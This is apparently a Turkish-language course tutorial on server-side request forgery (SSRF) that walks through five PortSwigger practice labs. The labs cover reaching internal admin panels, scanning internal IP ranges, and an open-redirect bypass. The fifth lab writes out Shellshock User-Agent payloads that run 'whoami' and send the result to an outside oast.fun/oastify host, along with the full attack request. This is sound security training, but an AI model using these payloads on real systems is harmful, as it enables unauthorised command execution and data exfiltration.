<h1 align="center">SSRF(Server Side Request Forgery) Nedir?</h1>


Sunucu Taraflı Sorgu Zafiyetinden geçen ders biraz bahsetmiştik. Buradaki zafiyet aslında sunucu tarafından gönderilen requestler ile ilgiliydi. Saldırgan sunucuya bazı requestler veriyordu ve sunucudan çıkan bu requestler ile de iç sistemlere erişebiliyordu. Aslında kısaca bundan bahsetmiştik. 

![alt text](<WebSec101 0x16_ss/image.png>)

Yukarıda yaptığımız açıklamayı görsel haline getirdik. Saldırgan web uygulamasına bir request yolluyor ve bu requestin içeriği nedeniyle bir şekilde iç sistem uygulamasına ulaşabiliyor. Burası da herhangi bir kullanıcının ulaşmaması gereken bir yer olduğu için zafiyet ortaya çıkmış oluyor. Yani SSRF.

## Blind SSRF

Kör ssrf olarak düşünebiliriz. Buradaki hikaye aslında saldırgan server'a bir request yollar ve bir şekilde iç sisteme erişir. Ancak uygulamanın yapısı gereği sunucu response'u kullanıcıya göstermek yerine veri tabanına kaydedebilir. Bu durumda saldırgan ssrf zafiyeti bulsa da response olarak verileri göremeyecektir. Bu tip ssrf zafiyetine **Blind SSRF** denir. 


# Alıştırma #1

* https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost 

* Alıştırmada stok kontrolü yapan bir özellik bulunuyormuş ancak bu özellik iç sistemden veri getiriyormuş. Bizden de bu özelliği kullanarak admin yetkilerini alıp carlos kullanıcısını silmemizi istiyor. 

* Siteye girelim ve bir ürün seçip stock check tuşuna bastıktan sonra gelen requesti repeater'a yollayalım; 

![alt text](<WebSec101 0x16_ss/image-1.png>)

![alt text](<WebSec101 0x16_ss/image-2.png>)

* şimdi stockApi yazan yerdeki şifrelenmiş kodun tamamını seçip inspector penceresine bakalım;

![alt text](<WebSec101 0x16_ss/image-3.png>)

* **http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1** yazan kodun şifrelenmemiş hali bu şekilde. Okursak görülüyor ki bu kısım iç sisteme gidiyor. Dolayısıyla admin yetkilerini almamız mümkün olabilir. 

* İlk hamle olarak stockApi yazan yere alıştırmada bize verilen **http://localhost/admin** yazalım ve send tuşuna basalım; 

![alt text](<WebSec101 0x16_ss/image-4.png>)

* Evet bu yöntem hemen işe yaradı. Sağ tarafta admin paneline ulaşmış bulunuyoruz. Şimdi buradan carlos kullanıcısını silen kodu bulup kopyalayalım ve kodun devamına yapıştıralım; 

![alt text](<WebSec101 0x16_ss/image-5.png>)

![alt text](<WebSec101 0x16_ss/image-6.png>)

* Send diyelim; 

![alt text](<WebSec101 0x16_ss/image-7.png>)

* Lab'ı çözmüş olduk. 

# Alıştırma #2 

* https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system

* Bu lab'da yine aynı özellik var ve bunu kullanmamızı istiyor. Fakat bu sefer **192.168.0.X** adresinin son hanesinin aralığında bir adrese gitmemizi istiyor. Yani x 0 ve 255 arası değer olmalı fakat hangisi olacağını bizim bulmamızı istiyor. Bulduktan sonra da admin yetkilerini alıp yine carlosu silmemizi istiyor. 

* Yine aynı şekilde **stock check** diyip bu requesti repeater'a yollayalım. Burada bir aralığı bulmamız gerekeceği için stockApi'de yazan kodu **intruder**'a göndermemiz gerekecek; 

![alt text](<WebSec101 0x16_ss/image-8.png>)

* Şimdi intruder'a gelelim ve kodun gereksiz kısmını silelim;

![alt text](<WebSec101 0x16_ss/image-9.png>)

* Burada ip'nin son rakamını seçip yukarıdan add tuşuna basalım ve buraya değer araması yapması için işaretlediğimizi belirtmiş olalım; 

![alt text](<WebSec101 0x16_ss/image-10.png>)

* Şimdi sağ taraftaki **Payloads** penceresinde şu ayarları yapalım ki 1 ile 255 arasında değer arasın;

![alt text](<WebSec101 0x16_ss/image-12.png>)

* **Start attack** tuşuna basalım ve bekleyelim;

* Bir süre sonra **404** status code'una sahip bir request göreceğiz;

![alt text](<WebSec101 0x16_ss/image-13.png>)

* 193 sayılı payload'da **Not Found**cevabı göreceğiz. Bu iyi bir haber çünkü sunucudan bize cevap dönüyor. Demek ki ipyi doğru girdik ve cevap döndüğü için de burada **Blind ssrf yok**. Ip dışında herhangi bir request yazmadık dolayısıyla kod da bir şey yapmayıp bulunamadı cevabı verdi. Şimdi repeater'a gelelim ve kodun son hanesini bulduğumuz payload(193) ile değiştirelim;

![alt text](<WebSec101 0x16_ss/image-16.png>)

* Repeatera aldığımız kodun sonuna admin yazalım ve send diyelim;

![alt text](<WebSec101 0x16_ss/image-15.png>)

![alt text](<WebSec101 0x16_ss/image-17.png>)

* Admin paneline ulaştık. Şimdi carlosu silme kodunu kopyalayıp kodumuza yapıştıralım ve tekrar send diyelim;

![alt text](<WebSec101 0x16_ss/image-18.png>)

![alt text](<WebSec101 0x16_ss/image-19.png>)

![alt text](<WebSec101 0x16_ss/image-20.png>)

* Burada bize verilen ip adresini kullandık ve son hanesini intruder'a vererek doğru adresi bulmaya çalıştık. Bulduktan sonra da admin paneline ulaşıp oradan **carlos** kullanıcısını sildik. 

# Alıştırma #3 

* https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection

* Bu alıştırmada **blind ssrf** varmış ve **burp suite**'in default server'ını kullanmamız gerekiyormuş. Bununla birlikte sadece **http requesti** yaptığımızda bu labı çözecekmişiz. Yani burp suite'in default server'ı kullanılarak buraya bir request yollanacak. 

* Lab'da bir ürünü inceleyelim ve bu requesti alalım; 

* Bu requestte referer kısmındaki adresi google.com ile değiştirip send tuşuna basalım;

![alt text](<WebSec101 0x16_ss/image-22.png>)

![alt text](<WebSec101 0x16_ss/image-23.png>)

* Response geldi. Buradaki http requesti google'a gidiyor. Buradan google yerine kendimize ait bir web sunucusu da yazarsak demek ki oraya da gidecek. Ne var ki dns talebi dışarıya çıkıyor. Yani bir websitesine gidiyor ancak burada bir blind ssrf söz konusu olduğu için response'u göremiyoruz. Lab'ı çözmek içinse sadece request yollamak yeterli. 

* Bu yüzden burpcollabrater.net'in adresi buraya giriliyor ve sonrasında lab çözülmüş oluyor.

![alt text](<WebSec101 0x16_ss/image-24.png>)

![alt text](<WebSec101 0x16_ss/image-25.png>)


# Alıştırma #4

* https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection

* Yine bir stock check özelliği var. Bizden bu özelliğin url'ini değiştirip admin arayüzüne ulaşmamızı istiyor. Sonra da carlosu silmeliymişiz. admin paneli de bu adreste imiş: **http://192.168.0.12:8080/admin**

* Siteye girip stock check özelliğinin requestini repeater'a yollayalım; 

![alt text](<WebSec101 0x16_ss/image-26.png>)

* Burada stokApi'deki adresi decode ettiğimizde; **/product/stock/check?productId=1&storeId=1** adresi gözüküyor. Fark ediyoruz ki burası bir endpoint yani sadece gidilecek yer verilmiş bir ip yok. Yani buraya bize verdiği adresi yazarsak; 

![alt text](<WebSec101 0x16_ss/image-27.png>)

* **Invalid url** response'u alacağız. 

* Demek ki **/product/stock/check?productId=1&storeId=1** bu adreslerin birinde bir zafiyet bulabilirsek o zaman admin paneline buradan ulaşabiliriz. 

* Bu bilgileri bir köşede dururken web sitesinin diğer özelliğine bakalım;

![alt text](<WebSec101 0x16_ss/image-28.png>)

* Görüldüğü üzere sağ altta next product seçeneği var. Buna tıklayıp requestini inceleyelim;

![alt text](<WebSec101 0x16_ss/image-29.png>)

* Response'una baktığımızda **Location** bilgisine dikkat edelim;

![alt text](<WebSec101 0x16_ss/image-30.png>)

* Bunu requestin en üst tarafında bulunan path özelliğinden aldığını görüyoruz; 

![alt text](<WebSec101 0x16_ss/image-31.png>)

* Şimdi bize verilen adresi buraya yapıştıralım;

![alt text](<WebSec101 0x16_ss/image-32.png>)

* Send dediğimizde;

![alt text](<WebSec101 0x16_ss/image-33.png>)

* Response dönüyor. Yani burada **http validation** yapmıyor dolayısıyla bunu kullanabiliriz.

* Şimdi bu kodu aşağıdaki şekilde kopyalayıp bir önceki requestimizin stockApi kısmına yapıştıralım;

![alt text](<WebSec101 0x16_ss/image-35.png>)

![alt text](<WebSec101 0x16_ss/image-36.png>)

* Response 200 OK olarak döndü yani admin paneline ulaştık.

* Şimdi aşağıdan carlosu silen kodu kopyalayıp buraya yapıştıralım;

![alt text](<WebSec101 0x16_ss/image-37.png>)

* Send dedikten sonra lab tamamlanıyor. 

# Alıştırma #5 

* https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation

* Bir ürün sayfası yüklendiğinde referrer header kısmında bir url dönüyormuş. Bu labı çözmemiz için **blind ssrf** saldırısı gerçekleştirmemiz isteniyor. Bu saldırıyı da **192.168.0.X** aralığında ve **8080** portunda yapmamız isteniyor. Yani geçtiğimiz alıştırmadaki gibi x yazan yeri 1 ile 255 arasında aratacağız.

* Başlamadan önce burpsuite'in bir eklentisi var ve o yükleniyor. İsmi **Collaborator Everywhere**;(Bu eklenti için Burp Suite Professional sürümü gerekli.)

![alt text](<WebSec101 0x16_ss/image-38.png>)

* Bu eklenti sayesinde burp suite tüm requestleri manipüle eder. Olası tüm header alanlarının içerisine BurpSuite'in collaborator server adresi yazılır ve cevap gelip gelmediği kontrol edilir. 

* Laba geri dönüp bir ürün sayfasına giriliyor ve buradaki get requesti burpten yakalanıyor;

![alt text](<WebSec101 0x16_ss/image-39.png>)

* Sonra buradaki referer kısmına burp'ün sunucu adresi yazılıyor; 

![alt text](<WebSec101 0x16_ss/image-40.png>)

![alt text](<WebSec101 0x16_ss/image-41.png>)

* Bu adrese send denildiğinde server'a get requesti geliyor; 

![alt text](<WebSec101 0x16_ss/image-42.png>)

* Burada User-Agent kısmı da değiştirilip tekrar gönderildiğinde değiştiği gözlemleniyor;

![alt text](<WebSec101 0x16_ss/image-44.png>)

* User-Agent kısmı manipüle edilebildiği için buradan **shellshock** zafiyeti yapılmaya çalışılacak;

* Bu noktada shellshock exploitlerden yararlanmak gerekiyor. User agent kısmına;

```
() { :; }; nslookup $(whoami).9r1gkbi8d28pf6aba2y65dutokubi26r.oastify.com
``` 

* Yukarıdaki kod girilecek;

![alt text](<WebSec101 0x16_ss/image-45.png>)

* Bu kodun **() { :; }; nslookup $(whoami)** kısmı linux'ta kullanıcı kimliğini bulmaya yarıyor. Buradan sonra gelen kısım ise burp sunucusunun adresi. Yani kullanıcı kimliği burp'ün sunucusuna geleceği için burp sunucusunun adresi yazılıyor. Sonra da aranılan kimliğe erişilmek isteniyor. Sonrasında aşağıda da referer kısmında **192.168.0.1** ip'si girilmiş ve bu ip'nin son hanesi intruder aracılığıyla taranmak isteniyor;

![alt text](<WebSec101 0x16_ss/image-46.png>)

* Sonrasında shellshock payload şu şekilde güncelleniyor: 

```
() { :; }; /usr/bin/nslookup $(whoami).iiqvmswbzrpcvswekawryb00mkrn5lfha.oast.fun
``` 

* **/usr/bin** isimli iki klasör ekleniyor ki kimliğin nerede aranacağı bilinsin. 

* Kodun son hali ise şu şekilde oluyor ve sonrasında intruder üzerinden Start Attack tuşuna basılıyor;

```

GET /product?productId=1 HTTP/2
Host: 0aec00c80327c824801181f3001b00c2.web-security-academy.net
Cookie: session=wNObiZvC1jYn9JRqLp1QwvQjnkFmLJe9
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: tr-TR,tr;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).iiqvmswbzrpcvswekawryb00mkrn5lfha.oast.fun
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: 192.168.0.1
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

* Sonra burp suite sunucusuna giden response'lar kontrol ediliyor; 

![alt text](<WebSec101 0x16_ss/image-47.png>)

* Görülüyor ki yazılan koddaki **$(whoami)** sorgusunun yerine id yazılmış. 

![alt text](<WebSec101 0x16_ss/image-48.png>)

* Bu id kopyalanıyor ve submit solution diyerek oraya yapıştırılıyor;

![alt text](<WebSec101 0x16_ss/image-49.png>)

![alt text](<WebSec101 0x16_ss/image-50.png>)

* Böylelikle lab çözülmüş oldu. 


* Alıştırmada özellikle bu zafiyetin kullanılarak çözülmesi isteniyor. Yapılan şey de bu zafiyeti ortaya çıkaran kodu yazıp (yani linux'ta kimlik sorgusu yapan kod) sonrasında burp adresine yollamak oldu. Bu sayede id'ye erişebildik.

# KAYNAK

[Web Security 0x16 | Server-Side Request Forgery Nedir ?](https://www.youtube.com/watch?v=2ONduwyqYUA&list=PLwP4ObPL5GY940XhCtAykxLxLEOKCu0nT&index=20)